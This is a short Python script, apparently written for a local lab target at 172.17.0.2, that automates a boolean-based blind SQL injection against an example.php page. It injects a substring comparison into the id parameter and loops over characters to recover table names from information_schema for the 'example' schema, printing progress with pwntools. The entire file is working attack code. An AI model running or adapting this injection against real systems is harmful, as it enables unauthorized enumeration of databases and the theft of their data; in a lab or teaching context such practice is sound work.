#!/usr/bin/python3
from pwn import log
import string, requests

characters = string.ascii_lowercase
bar = log.progress("Tables")

value = ""

for table in range(0,3):
    value += "\n\033[1;37m[\033[1;34m*\033[1;37m] "
    for position in range(0,10):
        for character in characters:
            request = requests.get(f"http://172.17.0.2/example.php?id=1'and (select substr(table_name,{position},1) from information_schema.tables where table_schema='example' limit {table},1)='{character}'-- -")
            if request.text == "Query was successfully":
                value += character
                bar.status(value)
